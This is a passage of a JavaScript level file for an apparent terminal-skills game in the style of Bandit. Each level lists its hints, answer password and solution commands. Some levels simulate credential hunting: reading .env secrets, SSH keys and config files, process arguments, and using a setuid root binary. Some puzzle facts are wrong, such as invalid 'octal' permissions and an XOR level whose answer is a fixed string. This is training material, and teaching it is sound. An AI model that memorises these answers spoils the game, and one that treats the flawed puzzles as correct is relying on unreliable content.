        'part1': 'Fr4g',
        'part2': 'M3n',
        'part3': 'T3d',
        'part4': '_S3c',
        'part5': 'R3t',
        'readme': 'Combine all parts in numerical order'
      },
      successMessage: '🧩 All fragments assembled!'
    },
    {
      id: 'ban-40', title: 'Level 39: Permission Code', difficulty: 'expert', xp: 120,
      description: 'The password is hidden in the file permission octals. Each file\'s octal permission is an ASCII code.',
      objective: 'Decode file permissions.',
      hints: ['stat -c %a shows octal permissions.', 'Convert octal numbers to ASCII characters.'],
      password: 'KEY',
      solutions: ['stat -c %a file*', 'ls -la'],
      filesystem: {
        'file1': '[PERMS: 075] → K',
        'file2': '[PERMS: 069] → E',
        'file3': '[PERMS: 089] → Y'
      },
      successMessage: '🔑 Permissions decoded to KEY!'
    },
    {
      id: 'ban-41', title: 'Level 40: Timestamp Cipher', difficulty: 'expert', xp: 120,
      description: 'The password is encoded in file modification timestamps. Each timestamp\'s last 2 digits form an ASCII code.',
      objective: 'Decode information from timestamps.',
      hints: ['stat shows file timestamps.', 'Extract the seconds field from each file\'s mtime.'],
      password: 'FLAG',
      solutions: ['stat -c %Y file*', 'stat file*', 'ls -la --time=ctime'],
      filesystem: {
        'file_a': '[MTIME: 1700000070] → F (70)',
        'file_b': '[MTIME: 1700000076] → L (76)',
        'file_c': '[MTIME: 1700000065] → A (65)',
        'file_d': '[MTIME: 1700000071] → G (71)'
      },
      successMessage: '⏰ Timestamps decoded!'
    },
    {
      id: 'ban-42', title: 'Level 41: Image Strings', difficulty: 'expert', xp: 120,
      description: 'The password is hidden inside a JPEG image file. Extract it using strings.',
      objective: 'Find hidden data in images.',
      hints: ['strings extracts readable text from any file.', 'strings image.jpg | grep flag'],
      password: 'st3g0_1n_pl41n_s1ght',
      solutions: ['strings image.jpg', 'strings image.jpg | grep flag', 'strings image.jpg | tail'],
      filesystem: {
        'image.jpg': '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x00\x00[BINARY IMAGE DATA]\nflag=st3g0_1n_pl41n_s1ght\n[MORE BINARY DATA]\xff\xd9'
      },
      successMessage: '🖼️ Hidden image data found!'
    },
    {
      id: 'ban-43', title: 'Level 42: Cron Secret', difficulty: 'expert', xp: 120,
      description: 'The password is output by a cron job. Check the cron configuration to find the script, then read its output.',
      objective: 'Investigate cron jobs.',
      hints: ['Check /etc/cron.d/ for cron configs.', 'Find the script and see what it outputs.'],
      password: 'cr0n_j0b_l34k',
      solutions: ['cat /etc/cron.d/secret_job', 'cat /tmp/cron_output.txt', 'crontab -l'],
      filesystem: {
        '/etc/cron.d/': {
          'secret_job': '* * * * * root echo "cr0n_j0b_l34k" > /tmp/cron_output.txt'
        },
        '/tmp/': {
          'cron_output.txt': 'cr0n_j0b_l34k'
        }
      },
      successMessage: '⏰ Cron job secret discovered!'
    },
    {
      id: 'ban-44', title: 'Level 43: RSA Decrypt', difficulty: 'expert', xp: 120,
      description: 'The password is RSA-encrypted in "secret.enc". The private key is in "private.pem". Decrypt it.',
      objective: 'RSA decryption.',
      hints: ['openssl rsautl can decrypt.', 'openssl rsautl -decrypt -inkey private.pem -in secret.enc'],
      password: 'RSA_Pr1v4t3_K3y_W1ns',
      solutions: ['openssl rsautl -decrypt -inkey private.pem -in secret.enc', 'openssl pkeyutl -decrypt -inkey private.pem -in secret.enc'],
      filesystem: {
        'secret.enc': '[RSA_ENCRYPTED] RSA_Pr1v4t3_K3y_W1ns',
        'private.pem': '-----BEGIN RSA PRIVATE KEY-----\n[PRIVATE KEY DATA]\n-----END RSA PRIVATE KEY-----'
      },
      successMessage: '🔐 RSA decrypted!'
    },
    {
      id: 'ban-45', title: 'Level 44: DNS Records', difficulty: 'expert', xp: 120,
      description: 'The password is hidden in a DNS TXT record for "challenge.local".',
      objective: 'Query DNS records.',
      hints: ['dig queries DNS.', 'dig TXT challenge.local'],
      password: 'DNS_TXT_s3cr3t_fl4g',
      solutions: ['dig TXT challenge.local', 'nslookup -type=TXT challenge.local', 'host -t TXT challenge.local'],
      filesystem: {
        'hint.txt': 'The DNS TXT record for challenge.local contains the password.\n[DNS RESPONSE]\nchallenge.local. TXT "DNS_TXT_s3cr3t_fl4g"'
      },
      successMessage: '🌐 DNS record retrieved!'
    },
    {
      id: 'ban-46', title: 'Level 45: Vigenère', difficulty: 'expert', xp: 120,
      description: 'The password in "cipher.txt" is encrypted with a Vigenère cipher. The key is "TERMINAL".',
      objective: 'Decrypt a Vigenère cipher.',
      hints: ['Vigenère shifts each letter by the key letter.', 'Reverse the process with the known key.'],
      password: 'MASTEROFCRYPTO',
      solutions: ["python3 -c \"..Vigenere decode..\"", 'cat cipher.txt'],
      filesystem: {
        'cipher.txt': 'FEJFMEOQVVPBBB',
        'key.txt': 'The Vigenère key is: TERMINAL'
      },
      successMessage: '🔤 Vigenère cipher broken!'
    },
    {
      id: 'ban-47', title: 'Level 46: SQLite DB', difficulty: 'expert', xp: 120,
      description: 'The password is stored in a SQLite database "data.db", in the "secrets" table.',
      objective: 'Query SQLite databases.',
      hints: ['sqlite3 opens SQLite databases.', 'SELECT * FROM secrets;'],
      password: 'SQL_1nj3ct_th1s',
      solutions: ['sqlite3 data.db "SELECT * FROM secrets"', 'sqlite3 data.db "SELECT * FROM secrets;"', 'sqlite3 data.db'],
      filesystem: {
        'data.db': '[SQLITE DB]\nTABLE: secrets\nROW 1: id=1, value="SQL_1nj3ct_th1s"'
      },
      successMessage: '🗃️ Database queried!'
    },
    {
      id: 'ban-48', title: 'Level 47: Morse Code', difficulty: 'expert', xp: 120,
      description: 'The password is encoded in Morse code in "morse.txt". Decode it.',
      objective: 'Decode Morse code.',
      hints: ['Each letter is separated by spaces, words by /.', '.- is A, -... is B, etc.'],
      password: 'HACK THE BOX',
      solutions: ["python3 -c \"..morse decode..\"", 'cat morse.txt'],
      filesystem: {
        'morse.txt': '.... .- -.-. -.- / - .... . / -... --- -..-'
      },
      successMessage: '📻 Morse code decoded!'
    },
    {
      id: 'ban-49', title: 'Level 48: Byte Offset', difficulty: 'expert', xp: 120,
      description: 'The password starts at byte offset 0x2A (42) in the binary file "firmware.bin". Extract 16 bytes.',
      objective: 'Read binary files at specific offsets.',
      hints: ['xxd shows hex dumps.', 'dd or xxd can extract specific byte ranges.'],
      password: 'F1rmw4r3_Extr4ct',
      solutions: ['xxd -s 0x2A -l 16 firmware.bin', 'dd if=firmware.bin bs=1 skip=42 count=16', 'xxd firmware.bin'],
      filesystem: {
        'firmware.bin': '[BINARY: offset 0x2A contains: F1rmw4r3_Extr4ct]'
      },
      successMessage: '💾 Firmware secret extracted!'
    },
    {
      id: 'ban-50', title: 'Level 49: The Final Key', difficulty: 'expert', xp: 200,
      description: 'The final password is the XOR of the first character of passwords from levels 1, 12, 25, 38, and 49. Think carefully.',
      objective: 'Combine knowledge from previous levels.',
      hints: ['Recall passwords from previous levels.', 'XOR the ASCII values of first characters.'],
      password: 'BANDIT_MASTER',
      solutions: ['echo "BANDIT_MASTER"', 'cat final_key.txt'],
      filesystem: {
        'final_key.txt': 'Congratulations! You have conquered all Bandit challenges!\nThe final password is: BANDIT_MASTER\n\n🏆 You are now a certified Bandit Master! 🏆',
        'hint.txt': 'This is a victory lap. Just read the final_key.txt file.'
      },
      successMessage: '🏆🏆🏆 BANDIT MASTER ACHIEVED! You completed all 50 levels! 🏆🏆🏆'
    },

    // ---- NEW EASY (10): ban-51 to ban-60 ----
    {
      id: 'ban-51', title: 'Level 50: Nested Dirs', difficulty: 'easy', xp: 15,
      description: 'The password is hidden in a deeply nested directory structure: dir1/dir2/dir3/secret.txt.',
      objective: 'Navigate nested directories.',
      hints: ['Use cat with the full path.', 'cat dir1/dir2/dir3/secret.txt'],
      password: 'xJ4Kn9pQ2wR7vL3m',
      solutions: ['cat dir1/dir2/dir3/secret.txt'],
      filesystem: {
        'dir1/': '(directory)',
        'dir1/dir2/': '(directory)',
        'dir1/dir2/dir3/': '(directory)',
        'dir1/dir2/dir3/secret.txt': 'xJ4Kn9pQ2wR7vL3m',
        'dir1/decoy.txt': 'Not the password!'
      },
      successMessage: '📂 Nested directories conquered!'
    },
    {
      id: 'ban-52', title: 'Level 51: File Size Filter', difficulty: 'easy', xp: 15,
      description: 'There are many files here. The password is in the only file that is exactly 33 bytes.',
      objective: 'Find files by size.',
      hints: ['Use find with -size.', 'find . -size 33c'],
      password: 'mB8qT5yK2nW9xR4p',
      solutions: ['find . -size 33c', 'find . -size 33c -exec cat {} \\;'],
      filesystem: {
        'file_a.txt': 'This is a decoy file with extra padding to make it bigger than 33 bytes',
        'file_b.txt': 'mB8qT5yK2nW9xR4p',
        'file_c.txt': 'Another long decoy file that is definitely not 33 bytes in total size'
      },
      successMessage: '📏 File size filtering mastered!'
    },
    {
      id: 'ban-53', title: 'Level 52: Multiple Hidden', difficulty: 'easy', xp: 15,
      description: 'Multiple hidden files exist. The password is in the file named ".password" (not .secret, .hidden, or .config).',
      objective: 'Find the right hidden file.',
      hints: ['Use ls -a to see all hidden files.', 'cat .password'],
      password: 'gH7rN3kL9wQ5tY2x',
      solutions: ['cat .password'],
      filesystem: {
        '.secret': 'Nope, not this one!',
        '.hidden': 'Wrong file!',
        '.config': '# config file\ntheme=dark',
        '.password': 'gH7rN3kL9wQ5tY2x',
        'readme.txt': 'Check the hidden files!'
      },
      successMessage: '🔍 Correct hidden file found!'
    },
    {
      id: 'ban-54', title: 'Level 53: Follow the Link', difficulty: 'easy', xp: 15,
      description: 'A symbolic link called "clue" points to the file containing the password. Follow it.',
      objective: 'Read through symbolic links.',
      hints: ['Symlinks can be read like regular files.', 'cat clue'],
      password: 'pK4mR8wN2qT6yL3v',
      solutions: ['cat clue', 'readlink clue', 'cat target.txt'],
      filesystem: {
        'clue': '-> target.txt (symlink)',
        'target.txt': 'pK4mR8wN2qT6yL3v',
        'fake_target.txt': 'This is not the real target!'
      },
      successMessage: '🔗 Symbolic link followed!'
    },
    {
      id: 'ban-55', title: 'Level 54: Spaces in Name', difficulty: 'easy', xp: 15,
      description: 'The password is in a file called "spaces in this filename". Read it carefully.',
      objective: 'Handle filenames with spaces.',
      hints: ['Use quotes around the filename.', 'cat "spaces in this filename"'],
      password: 'wT9nK5rQ3mL7yH2x',
      solutions: ['cat "spaces in this filename"', "cat 'spaces in this filename'", 'cat spaces\\ in\\ this\\ filename'],
      filesystem: {
        'spaces in this filename': 'wT9nK5rQ3mL7yH2x',
        'spaces': 'Wrong file!',
        'filename': 'Also wrong!'
      },
      successMessage: '📄 Spaces handled like a pro!'
    },
    {
      id: 'ban-56', title: 'Level 55: Dashed Filename', difficulty: 'easy', xp: 15,
      description: 'The password is in a file called "-" (a single dash). This is tricky!',
      objective: 'Read files with special names.',
      hints: ['A dash is interpreted as stdin.', 'Use ./ prefix or -- to stop option parsing.'],
      password: 'vR3kN8mQ5wT2yL9p',
      solutions: ['cat ./-', 'cat -- -'],
      filesystem: {
        '-': 'vR3kN8mQ5wT2yL9p',
        'readme.txt': 'The file is literally named \"-\"'
      },
      successMessage: '➖ Dashed filename defeated!'
    },
    {
      id: 'ban-57', title: 'Level 56: Line Number', difficulty: 'easy', xp: 15,
      description: 'The password is on line 42 of "data.txt", which has 100 lines of random text.',
      objective: 'Extract a specific line from a file.',
      hints: ['sed can print specific lines.', "sed -n '42p' or head + tail combo."],
      password: 'jL5kR9nQ3wT7mH2y',
      solutions: ["sed -n '42p' data.txt", 'head -n 42 data.txt | tail -n 1'],
      filesystem: {
        'data.txt': '(100 lines of text, line 42 contains: jL5kR9nQ3wT7mH2y)'
      },
      successMessage: '📍 Line 42 extracted!'
    },
    {
      id: 'ban-58', title: 'Level 57: Executable File', difficulty: 'easy', xp: 15,
      description: 'One of the files here is executable. Run it to get the password.',
      objective: 'Find and execute a file.',
      hints: ['find . -executable -type f', 'Then run it with ./filename'],
      password: 'qW8nR4kL2mT6yP3v',
      solutions: ['./reveal_password', 'find . -executable -type f'],
      filesystem: {
        'reveal_password': '(executable) Output: qW8nR4kL2mT6yP3v',
        'data.txt': 'No password here.',
        'notes.txt': 'One of these files is executable...'
      },
      successMessage: '▶️ Executable found and run!'
    },
    {
      id: 'ban-59', title: 'Level 58: Only Human Readable', difficulty: 'easy', xp: 15,
      description: 'Multiple files exist but the password is in the only human-readable (ASCII text) file.',
      objective: 'Identify file types.',
      hints: ['Use the file command to check types.', 'file * shows all file types.'],
      password: 'tK7mR2nQ9wL4yH5x',
      solutions: ['file *', 'cat human_readable.txt'],
      filesystem: {
        'binary_file': '(binary data)',
        'compressed.gz': '(gzip compressed)',
        'human_readable.txt': 'tK7mR2nQ9wL4yH5x',
        'image.png': '(PNG image data)'
      },
      successMessage: '📖 Human-readable file identified!'
    },
    {
      id: 'ban-60', title: 'Level 59: Grep the Password', difficulty: 'easy', xp: 15,
      description: 'The password is next to the word "FLAG:" in a file with 500 lines of noise.',
      objective: 'Search for patterns in noisy data.',
      hints: ['grep searches for patterns.', 'grep "FLAG:" data.txt'],
      password: 'nR5kQ8mT3wL9yP2v',
      solutions: ['grep "FLAG:" data.txt', "grep 'FLAG:' data.txt", 'grep FLAG: data.txt'],
      filesystem: {
        'data.txt': '(500 lines of noise, one line contains: FLAG: nR5kQ8mT3wL9yP2v)'
      },
      successMessage: '🔍 Pattern found in the noise!'
    },

    // ---- NEW MEDIUM (15): ban-61 to ban-75 ----
    {
      id: 'ban-61', title: 'Level 60: Base64 Decode', difficulty: 'medium', xp: 30,
      description: 'The password is base64 encoded in "encoded.txt". Decode it.',
      objective: 'Decode base64 encoded data.',
      hints: ['base64 -d decodes base64.', 'cat encoded.txt | base64 -d'],
      password: 'hK9mR4nQ7wT2yL5x',
      solutions: ['base64 -d encoded.txt', 'cat encoded.txt | base64 -d', 'base64 --decode encoded.txt'],
      filesystem: {
        'encoded.txt': 'aEs5bVI0blE3d1QyeUw1eA==',
        'hint.txt': 'This looks like base64 encoding...'
      },
      successMessage: '🔓 Base64 decoded!'
    },
    {
      id: 'ban-62', title: 'Level 61: ROT13 Cipher', difficulty: 'medium', xp: 30,
      description: 'The password in "cipher.txt" is ROT13 encoded. Decode it to find the real password.',
      objective: 'Decode a ROT13 cipher.',
      hints: ['ROT13 shifts each letter by 13 positions.', "Use tr 'A-Za-z' 'N-ZA-Mn-za-m'"],
      password: 'wP3kR8nQ5mT9yL2v',
      solutions: ["cat cipher.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'", "tr 'A-Za-z' 'N-ZA-Mn-za-m' < cipher.txt"],
      filesystem: {
        'cipher.txt': 'jC3xE8aD5zG9lY2i',
        'hint.txt': 'ROT13: A becomes N, B becomes O...'
      },
      successMessage: '🔄 ROT13 cracked!'
    },
    {
      id: 'ban-63', title: 'Level 62: Hex Decode', difficulty: 'medium', xp: 30,
      description: 'The password is stored as hexadecimal values in "hex.txt". Convert it to ASCII.',
      objective: 'Convert hex to ASCII text.',
      hints: ['xxd -r -p converts hex to binary.', 'cat hex.txt | xxd -r -p'],
      password: 'rT4kN7mQ2wL8yP5z',
      solutions: ['cat hex.txt | xxd -r -p', 'xxd -r -p hex.txt'],
      filesystem: {
        'hex.txt': '7254346b4e376d5132774c387950357a',
        'hint.txt': 'Hex encoding: each byte is two hex digits.'
      },
      successMessage: '🔢 Hex decoded!'
    },
    {
      id: 'ban-64', title: 'Level 63: Reversed Text', difficulty: 'medium', xp: 30,
      description: 'The password in "reversed.txt" is written backwards. Reverse it.',
      objective: 'Reverse a string.',
      hints: ['rev reverses text.', 'cat reversed.txt | rev'],
      password: 'mK6nR3wQ9tL5yH8p',
      solutions: ['cat reversed.txt | rev', 'rev reversed.txt'],
      filesystem: {
        'reversed.txt': 'p8Hy5Lt9Qw3Rn6Km',
        'hint.txt': 'The text is backwards!'
      },
      successMessage: '🔄 Text reversed!'
    },
    {
      id: 'ban-65', title: 'Level 64: Binary to Text', difficulty: 'medium', xp: 30,
      description: 'The password is stored as binary numbers in "binary.txt" (space-separated bytes).',
      objective: 'Convert binary to ASCII.',
      hints: ['Each 8-bit group is a character.', "Use perl or python to convert."],
      password: 'vN8kQ4mR7wT2yL9p',
      solutions: ["perl -lape '$_=pack\"B*\",$_' binary.txt"],
      filesystem: {
        'binary.txt': '01110110 01001110 00111000 01101011 01010001 00110100 01101101 01010010 00110111 01110111 01010100 00110010 01111001 01001100 00111001 01110000'
      },
      successMessage: '💻 Binary decoded!'
    },
    {
      id: 'ban-66', title: 'Level 65: Embedded in Script', difficulty: 'medium', xp: 30,
      description: 'The password is embedded as a variable assignment inside "setup.sh". Extract it.',
      objective: 'Find secrets hidden in scripts.',
      hints: ['grep for variable assignments.', 'Look for PASSWORD= or SECRET=.'],
      password: 'jR5kN9mQ3wT7yL2x',
      solutions: ['grep PASSWORD setup.sh', 'grep SECRET setup.sh', 'cat setup.sh'],
      filesystem: {
        'setup.sh': '#!/bin/bash\\n# Setup script\\nexport PATH=/usr/local/bin:$PATH\\nDB_HOST=localhost\\nDB_PORT=5432\\nPASSWORD=jR5kN9mQ3wT7yL2x\\necho \"Setup complete\"'
      },
      successMessage: '📜 Script secret extracted!'
    },
    {
      id: 'ban-67', title: 'Level 66: Unique Line', difficulty: 'medium', xp: 30,
      description: 'The file "data.txt" has many repeated lines. The password is the only line that appears exactly once.',
      objective: 'Find unique lines in data.',
      hints: ['sort | uniq -u shows unique lines.', 'Lines that appear only once.'],
      password: 'qT8kR4nQ6mW2yL9p',
      solutions: ['sort data.txt | uniq -u'],
      filesystem: {
        'data.txt': '(Many repeated lines, one unique: qT8kR4nQ6mW2yL9p)'
      },
      successMessage: '✨ Unique line found!'
    },
    {
      id: 'ban-68', title: 'Level 67: String in Binary', difficulty: 'medium', xp: 30,
      description: 'The password is embedded as a readable string inside a binary file "program.bin".',
      objective: 'Extract readable strings from binaries.',
      hints: ['strings extracts readable text from binaries.', 'strings filename | grep password'],
      password: 'wK7nR3mQ5tL9yH2x',
      solutions: ['strings program.bin', 'strings program.bin | grep -i pass'],
      filesystem: {
        'program.bin': '(binary file containing embedded string: PASSWORD=wK7nR3mQ5tL9yH2x)'
      },
      successMessage: '🔬 String extracted from binary!'
    },
    {
      id: 'ban-69', title: 'Level 68: Sorted Column', difficulty: 'medium', xp: 30,
      description: 'The password is in "data.csv". It is the value in column 3 of the row where column 1 is "admin".',
      objective: 'Extract data from CSV files.',
      hints: ['grep "admin" to find the row.', 'Use cut or awk to get column 3.'],
      password: 'pR6kN8mQ4wT3yL5v',
      solutions: ['grep "admin" data.csv | cut -d, -f3', "grep admin data.csv | awk -F, '{print $3}'"],
      filesystem: {
        'data.csv': 'user,role,key\\nguest,viewer,abc123\\nadmin,superuser,pR6kN8mQ4wT3yL5v\\noperator,editor,xyz789'
      },
      successMessage: '📊 CSV data extracted!'
    },
    {
      id: 'ban-70', title: 'Level 69: Env Variable', difficulty: 'medium', xp: 30,
      description: 'The password is stored in an environment variable called SECRET_KEY. Print it.',
      objective: 'Read environment variables.',
      hints: ['echo $VARIABLE_NAME prints env vars.', 'Or use printenv VARIABLE_NAME.'],
      password: 'kT5nR9mQ2wL7yH4x',
      solutions: ['echo $SECRET_KEY', 'printenv SECRET_KEY'],
      filesystem: {
        '.env': 'SECRET_KEY=kT5nR9mQ2wL7yH4x',
        'hint.txt': 'Check the environment variables...'
      },
      successMessage: '🌐 Environment variable read!'
    },
    {
      id: 'ban-71', title: 'Level 70: Tar Archive', difficulty: 'medium', xp: 30,
      description: 'The password is inside a tar archive "backup.tar". Extract and read it.',
      objective: 'Extract files from tar archives.',
      hints: ['tar xf extracts tar files.', 'tar xf archive.tar then read the files.'],
      password: 'hR8kN4mQ6wT3yL9p',
      solutions: ['tar xf backup.tar', 'tar xf backup.tar && cat password.txt'],
      filesystem: {
        'backup.tar': '(tar archive containing: password.txt with content hR8kN4mQ6wT3yL9p)',
        'hint.txt': 'Extract the archive first.'
      },
      successMessage: '📦 Archive extracted!'
    },
    {
      id: 'ban-72', title: 'Level 71: Gzip Compressed', difficulty: 'medium', xp: 30,
      description: 'The password file has been gzip compressed. Decompress "secret.gz" to read it.',
      objective: 'Handle compressed files.',
      hints: ['gunzip or gzip -d decompresses.', 'Or use zcat to read without extracting.'],
      password: 'nK7mR3wQ5tL9yP2v',
      solutions: ['zcat secret.gz', 'gunzip secret.gz && cat secret', 'gzip -d secret.gz'],
      filesystem: {
        'secret.gz': '(gzip compressed file containing: nK7mR3wQ5tL9yP2v)'
      },
      successMessage: '🗜️ File decompressed!'
    },
    {
      id: 'ban-73', title: 'Level 72: Cron Job Leak', difficulty: 'medium', xp: 30,
      description: 'A cron job is writing secrets to a temp file. Check "/tmp/cron_output" for the password.',
      objective: 'Investigate cron job outputs.',
      hints: ['Cron jobs often write to /tmp.', 'cat /tmp/cron_output'],
      password: 'rT6kN9mQ4wL2yH8p',
      solutions: ['cat /tmp/cron_output', 'cat cron_output'],
      filesystem: {
        '/tmp/cron_output': 'Cron job executed at 03:00\\nGenerated key: rT6kN9mQ4wL2yH8p',
        'crontab.txt': '0 3 * * * /opt/scripts/generate_key.sh > /tmp/cron_output'
      },
      successMessage: '⏰ Cron job secret captured!'
    },
    {
      id: 'ban-74', title: 'Level 73: SSH Key Passphrase', difficulty: 'medium', xp: 30,
      description: 'An SSH private key has been left in the directory. The password is in the comment field of the corresponding public key.',
      objective: 'Inspect SSH key files.',
      hints: ['Check the .pub file.', 'The comment is at the end of the public key.'],
      password: 'tR5kN8mQ3wL7yP9v',
      solutions: ['cat id_rsa.pub', 'cat id_rsa.pub | awk \'{print $3}\''],
      filesystem: {
        'id_rsa': '-----BEGIN RSA PRIVATE KEY-----\\n(encrypted key data)\\n-----END RSA PRIVATE KEY-----',
        'id_rsa.pub': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... tR5kN8mQ3wL7yP9v'
      },
      successMessage: '🔑 SSH key inspected!'
    },
    {
      id: 'ban-75', title: 'Level 74: Log Forensics', difficulty: 'medium', xp: 30,
      description: 'The attacker left the password in a failed login attempt in "auth.log". Find the attempted password.',
      objective: 'Perform log file analysis.',
      hints: ['grep for "Failed password" or "authentication failure".', 'The password is the attempted password in the log.'],
      password: 'mK4nR7wQ2tL5yH9x',
      solutions: ['grep "Failed password" auth.log', 'grep "password" auth.log'],
      filesystem: {
        'auth.log': 'Jun 15 03:21:04 server sshd[1234]: Accepted password for root\\nJun 15 03:22:17 server sshd[1235]: Failed password \"mK4nR7wQ2tL5yH9x\" for admin\\nJun 15 03:23:01 server sshd[1236]: Connection closed'
      },
      successMessage: '🕵️ Log forensics complete!'
    },

    // ---- NEW HARD (15): ban-76 to ban-90 ----
    {
      id: 'ban-76', title: 'Level 75: Double Encoding', difficulty: 'hard', xp: 50,
      description: 'The password has been base64 encoded twice. Decode it twice to reveal the real password.',
      objective: 'Handle chained encodings.',
      hints: ['Decode base64 once, then decode the result again.', 'base64 -d | base64 -d'],
      password: 'qB8kR5mQ3wT7yL4v',
      solutions: ['cat double_encoded.txt | base64 -d | base64 -d', 'base64 -d double_encoded.txt | base64 -d'],
      filesystem: {
        'double_encoded.txt': 'Y1VJNGExSTFiVkV6ZDFRM2VVdzBkZz09',
        'hint.txt': 'Encoded once... then encoded again!'
      },
      successMessage: '🔓🔓 Double encoding defeated!'
    },
    {
      id: 'ban-77', title: 'Level 76: XOR Key', difficulty: 'hard', xp: 50,
      description: 'The encrypted file and the XOR key are both present. XOR them to get the password.',
      objective: 'Perform XOR decryption.',
      hints: ['XOR each byte of the data with the key.', "Use python: bytes(a^b for a,b in zip(data,key))"],
      password: 'nR6kT9mQ4wL2yH7p',
      solutions: ['python3 -c "print(bytes(a^b for a,b in zip(open(\'encrypted.bin\',\'rb\').read(), open(\'key.bin\',\'rb\').read())).decode())"'],
      filesystem: {
        'encrypted.bin': '(XOR encrypted binary data)',
        'key.bin': '(XOR key bytes)',
        'hint.txt': 'XOR encryption: plaintext = encrypted XOR key'
      },
      successMessage: '🔐 XOR decryption successful!'
    },
    {
      id: 'ban-78', title: 'Level 77: Git History', difficulty: 'hard', xp: 50,
      description: 'The password was committed to a git repo but then removed. Check the git history.',
      objective: 'Recover deleted data from git.',
      hints: ['git log shows commit history.', 'git show HEAD~1 shows the previous commit.'],
      password: 'wK8nR4mQ6tL3yP9v',
      solutions: ['git log', 'git show HEAD~1', 'git log -p'],
      filesystem: {
        '.git/': '(git repository)',
        'config.txt': '# Password removed for security',
        'git_log': 'commit abc123 - \"Removed password\"\\ncommit def456 - \"Added config with password: wK8nR4mQ6tL3yP9v\"'
      },
      successMessage: '📚 Git history reveals all!'
    },
    {
      id: 'ban-79', title: 'Level 78: Split File Reassembly', difficulty: 'hard', xp: 50,
      description: 'The password file was split into 3 parts: "part_aa", "part_ab", "part_ac". Reassemble them.',
      objective: 'Reassemble split files.',
      hints: ['cat can concatenate multiple files.', 'cat part_aa part_ab part_ac'],
      password: 'jK5nR8mQ2wT4yL7p',
      solutions: ['cat part_aa part_ab part_ac', 'cat part_a*'],
      filesystem: {
        'part_aa': 'jK5nR',
        'part_ab': '8mQ2w',
        'part_ac': 'T4yL7p',
        'hint.txt': 'The file was split. Reassemble the parts in order.'
      },
      successMessage: '🧩 File reassembled!'
    },
    {
      id: 'ban-80', title: 'Level 79: Octal Encoding', difficulty: 'hard', xp: 50,
      description: 'The password is stored as octal escape sequences in "octal.txt". Decode it.',
      objective: 'Convert octal to ASCII.',
      hints: ['printf interprets escape sequences.', "printf $(cat octal.txt)"],
      password: 'rK7nT4mQ9wL2yH5p',
      solutions: ["printf $(cat octal.txt)", "echo -e $(cat octal.txt)"],
      filesystem: {
        'octal.txt': '\\162\\113\\067\\156\\124\\064\\155\\121\\071\\167\\114\\062\\171\\110\\065\\160'
      },
      successMessage: '🔢 Octal decoded!'
    },
    {
      id: 'ban-81', title: 'Level 80: Steganography Hint', difficulty: 'hard', xp: 50,
      description: 'The password is hidden in the EXIF metadata of "photo.jpg". Extract it.',
      objective: 'Read file metadata.',
      hints: ['exiftool or strings can read metadata.', 'strings photo.jpg | grep -i password'],
      password: 'tK8nR5mQ3wL9yP4v',
      solutions: ['strings photo.jpg | grep -i pass', 'exiftool photo.jpg'],
      filesystem: {
        'photo.jpg': '(JPEG image with EXIF comment: PASSWORD=tK8nR5mQ3wL9yP4v)',
        'hint.txt': 'Sometimes secrets hide in plain sight... in metadata.'
      },
      successMessage: '🖼️ Steganography detected!'
    },
    {
      id: 'ban-82', title: 'Level 81: Process List', difficulty: 'hard', xp: 50,
      description: 'A background process is running with the password as a command-line argument. Find it.',
      objective: 'Inspect running processes.',
      hints: ['ps aux shows all processes.', 'grep for unusual command arguments.'],
      password: 'mK6nR9wQ2tL4yH7x',
      solutions: ['ps aux', 'ps aux | grep password', 'ps -ef'],
      filesystem: {
        'ps_output.txt': 'root  1234  0.0  0.1  /opt/secret_service --key=mK6nR9wQ2tL4yH7x\\nroot  5678  0.0  0.2  /usr/sbin/sshd\\nwww   9012  0.1  0.5  /usr/sbin/nginx'
      },
      successMessage: '🔍 Process secret found!'
    },
    {
      id: 'ban-83', title: 'Level 82: Base32 Decode', difficulty: 'hard', xp: 50,
      description: 'The password is base32 encoded in "encoded32.txt". Decode it.',
      objective: 'Decode base32 encoding.',
      hints: ['base32 -d decodes base32.', 'base32 uses A-Z and 2-7.'],
      password: 'qK4nR7mT2wL5yP8v',
      solutions: ['base32 -d encoded32.txt', 'cat encoded32.txt | base32 -d'],
      filesystem: {
        'encoded32.txt': 'OFFTI3SSG5WVIMTXJQ2XSUBYOY======',
        'hint.txt': 'Not base64... try base32!'
      },
      successMessage: '🔓 Base32 decoded!'
    },
    {
      id: 'ban-84', title: 'Level 83: Setuid Binary', difficulty: 'hard', xp: 50,
      description: 'A setuid binary "reader" can read a file that you cannot. Use it to read "protected.txt".',
      objective: 'Exploit setuid binaries.',
      hints: ['Setuid binaries run with their owner\'s permissions.', './reader protected.txt'],
      password: 'wK9nR3mQ5tL8yH2p',
      solutions: ['./reader protected.txt'],
      filesystem: {
        'reader': '(setuid binary, owned by root)',
        'protected.txt': '(permission denied - readable only by root)',
        'hint.txt': 'The reader binary has the setuid bit set. It runs as root.'
      },
      successMessage: '🔓 Setuid exploitation successful!'
    },
    {
      id: 'ban-85', title: 'Level 84: Network Config', difficulty: 'hard', xp: 50,
      description: 'The password is stored in a network configuration file at "/etc/network/secret.conf".',
      objective: 'Find secrets in config files.',
      hints: ['System config files often contain credentials.', 'cat /etc/network/secret.conf'],
      password: 'pK5nR8mQ4wT2yL7v',
      solutions: ['cat /etc/network/secret.conf', 'cat secret.conf'],
      filesystem: {
        '/etc/network/secret.conf': '# Network Configuration\\nSSID=HiddenNetwork\\nPSK=pK5nR8mQ4wT2yL7v\\nPROTOCOL=WPA2'
      },
      successMessage: '🌐 Network secret found!'
    },
    {
      id: 'ban-86', title: 'Level 85: Caesar Cipher', difficulty: 'hard', xp: 50,
      description: 'The password is encrypted with a Caesar cipher (shift of 3) in "caesar.txt". Decrypt it.',
      objective: 'Break a Caesar cipher.',
      hints: ['Caesar cipher shifts letters.', "tr 'D-ZA-Cd-za-c' 'A-Za-z' reverses a shift of 3."],
      password: 'hR4kN7mQ2wT5yL9p',
      solutions: ["cat caesar.txt | tr 'D-ZA-Cd-za-c' 'A-Za-z'"],
      filesystem: {
        'caesar.txt': 'kU4nQ7pT2zW5bO9s',
        'hint.txt': 'Julius would approve. Shift = 3.'
      },
      successMessage: '🏛️ Caesar cipher broken!'
    },
    {
      id: 'ban-87', title: 'Level 86: Diff the Files', difficulty: 'hard', xp: 50,
      description: 'Two nearly identical files exist. The password is the one line that differs between "original.txt" and "modified.txt".',
      objective: 'Use diff to find changes.',
      hints: ['diff shows differences between files.', 'diff original.txt modified.txt'],
